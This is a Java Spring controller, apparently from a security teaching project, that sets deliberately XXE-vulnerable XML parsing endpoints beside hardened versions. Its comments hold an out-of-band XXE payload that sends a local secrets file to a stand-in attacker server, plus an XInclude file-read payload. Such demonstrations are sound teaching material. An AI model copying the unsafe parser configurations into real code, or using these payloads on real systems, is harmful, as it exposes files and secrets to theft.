package com.example.cwe.xml_injecions;

import com.example.cwe.xml_injecions.pojo.User;
import com.example.cwe.xml_injecions.pojo.Users;
import org.dom4j.DocumentException;
import org.dom4j.io.SAXReader;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

import javax.servlet.http.HttpServletResponse;
import javax.xml.XMLConstants;
import javax.xml.bind.JAXB;
import javax.xml.bind.JAXBException;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParserFactory;
import javax.xml.transform.Source;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.sax.SAXSource;
import javax.xml.transform.stream.StreamResult;
import java.io.IOException;
import java.io.StringReader;
import java.io.StringWriter;
import java.util.UUID;

/**
 * Пример с загрузкой зловредного xml с сервера злоумышленника и последующей отправкой данных на его сервер
 * Исходный xml:
 * <?xml version="1.0" encoding="UTF-8"?>
 * <!DOCTYPE foo [
 * <!ENTITY % pe SYSTEM "http://localhost:7171/evil/xxe-file"> %pe; %param1;
 * ]>
 * <foo>&external;</foo>
 * <p>
 * xxe-file:
 * <!ENTITY % payload SYSTEM "file:///c:/temp/secrets.txt">
 * <!ENTITY % param1 "<!ENTITY external SYSTEM 'http://localhost:7171/evil/log-data?data=%payload;'>">
 * <p>
 * Вектора атак:
 * <a href="https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/xxe-xee-xml-external-entity.md">...</a>
 */
@RestController
@RequestMapping("xxe")
public class XxeInjectionController {

    /**
     * javax.xml.bind.UnmarshalException - with linked exception: [org.xml.sax.SAXParseException]
     * External Entity: Failed to read external document 'secrets.txt', because 'file' access is not allowed due to
     * restriction set by the accessExternalDTD property.
     * По умолчанию поддержка file, http в XXE отключена. Нужно System.setProperty("javax.xml.accessExternalDTD", "all");
     * Отключено с java 1.7:
     * <a href="https://docs.oracle.com/javase/7/docs/api/javax/xml/XMLConstants.html#ACCESS_EXTERNAL_SCHEMA">...</a>
     * <p>
     * Необходимо только для демонстрации <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts" >
     * Отлично работает с не "system" сущностями, например, lol
     */
    @PostMapping(value = "unmarshall-full-unsafe",
            consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
    @ResponseStatus(HttpStatus.CREATED)
    public void xxeFileUnmarshallUnsafe(@RequestBody String xml, HttpServletResponse response) throws JAXBException, IOException {
        System.setProperty("javax.xml.accessExternalDTD", "all");
        User user = JAXB.unmarshal(new StringReader(xml), User.class);
        response.getWriter().write(user.toString());
    }

    @PostMapping(value = "unmarshall-safe",
            consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
    @ResponseStatus(HttpStatus.CREATED)
    public void unmarshallSafe(@RequestBody String xml, HttpServletResponse response) throws IOException, SAXException, ParserConfigurationException {
        // Because javax.xml.bind.Unmarshaller parses XML but does not support any flags for disabling XXE, you must
        // parse the untrusted XML through a configurable secure parser first, generate a source object as a result,
        // and pass the source object to the Unmarshaller. For example:

        SAXParserFactory spf = SAXParserFactory.newInstance();

        //Option 1: This is the PRIMARY defense against XXE
        spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        spf.setXIncludeAware(false);

        //Do unmarshall operation
        Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(),
                new InputSource(new StringReader(xml)));
        User user = JAXB.unmarshal(xmlSource, User.class);
        response.getWriter().write(user.toString());
    }

    @PostMapping(value = "domparse-unsafe",
            consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
    @ResponseStatus(HttpStatus.CREATED)
    public void domParseUnsafe(@RequestBody String xml, HttpServletResponse response) throws ParserConfigurationException, IOException, SAXException {
        Users users = new Users();
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = dbf.newDocumentBuilder();
        Document document = builder.parse(new InputSource(new StringReader(xml)));
        document.getDocumentElement().normalize();
        NodeList nodeList = document.getElementsByTagName("user");
        for (int i = 0; i < nodeList.getLength(); i++) {
            Node node = nodeList.item(i);
            if (node.getNodeType() == Node.ELEMENT_NODE) {
                Element element = (Element) node;
                User user = new User(
                        element.getElementsByTagName("username").item(0).getTextContent(),
                        element.getElementsByTagName("password").item(0).getTextContent(),
                        element.getElementsByTagName("group").item(0).getTextContent(),
                        UUID.fromString(element.getAttribute("id")),
                        element.getElementsByTagName("email").item(0).getTextContent());
                users.addUser(user);
            }
        }
        response.getWriter().write(users.toString());
    }

    @PostMapping(value = "domparse-safe",
            consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
    @ResponseStatus(HttpStatus.CREATED)
    public void domParseSafe(@RequestBody String xml, HttpServletResponse response) throws ParserConfigurationException, IOException, SAXException {
        Users users = new Users();
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

        // This is the PRIMARY defense. If DTDs (doctypes) are disallowed, almost all
        // XML entity attacks are prevented
        // Xerces 2 only - http://xerces.apache.org/xerces2-j/features.html#disallow-doctype-decl
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        // and these as well, per Timothy Morgan's 2014 paper: "XML Schema, DTD, and Entity Attacks"
        dbf.setXIncludeAware(false);

        DocumentBuilder builder = dbf.newDocumentBuilder();
        Document document = builder.parse(new InputSource(new StringReader(xml)));
        document.getDocumentElement().normalize();
        NodeList nodeList = document.getElementsByTagName("user");
        for (int i = 0; i < nodeList.getLength(); i++) {
            Node node = nodeList.item(i);
            if (node.getNodeType() == Node.ELEMENT_NODE) {
                Element element = (Element) node;
                User user = new User(
                        element.getElementsByTagName("username").item(0).getTextContent(),
                        element.getElementsByTagName("password").item(0).getTextContent(),
                        element.getElementsByTagName("group").item(0).getTextContent(),
                        UUID.fromString(element.getAttribute("id")),
                        element.getElementsByTagName("email").item(0).getTextContent());
                users.addUser(user);
            }
        }
        response.getWriter().write(users.toString());
    }

    @PostMapping(value = "saxparse-unsafe",
            consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
    @ResponseStatus(HttpStatus.CREATED)
    public void saxParseUnsafe(@RequestBody String xml, HttpServletResponse response) throws ParserConfigurationException, IOException, SAXException, DocumentException {
        SAXReader reader = new SAXReader();
        org.dom4j.Document document = reader.read(new InputSource(new StringReader(xml)));
        response.getWriter().write(document.asXML());
    }

    @PostMapping(value = "saxparse-safe",
            consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
    @ResponseStatus(HttpStatus.CREATED)
    public void saxParseSafe(@RequestBody String xml, HttpServletResponse response) throws ParserConfigurationException, IOException, SAXException, DocumentException {
        // To protect a Java org.dom4j.io.SAXReader from an XXE attack, do this:
        SAXReader saxReader = new SAXReader();
        saxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        saxReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
        saxReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        org.dom4j.Document document = saxReader.read(new InputSource(new StringReader(xml)));
        response.getWriter().write(document.asXML());
    }


    /**
     * Только для проверки XInclude
     * <?xml version="1.0" encoding="UTF-8"?>
     * <foo xmlns:xi="http://www.w3.org/2001/XInclude">
     * <xi:include parse="text" href="file:///c:/temp/secrets.txt"/>
     * </foo>
     */

    @PostMapping(value = "xinclude-unsafe",
            consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
    @ResponseStatus(HttpStatus.CREATED)
    public void xincludeUnsafe(@RequestBody String xml, HttpServletResponse response) throws Exception {

        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

        dbf.setXIncludeAware(true);
        dbf.setNamespaceAware(true);

        DocumentBuilder db = dbf.newDocumentBuilder();
        Document document = db.parse(new InputSource(new StringReader(xml)));  // parse xml

        response.getWriter().write(printXML(document));
    }

    private static String printXML(final Document responseDoc) throws Exception {
        DOMSource domSource = new DOMSource(responseDoc);
        StringWriter stringWriter = new StringWriter();
        StreamResult streamResult = new StreamResult(stringWriter);
        TransformerFactory transformerFactory = TransformerFactory.newInstance();
        transformerFactory.newTransformer().transform(domSource, streamResult);
        return stringWriter.toString();
    }


}
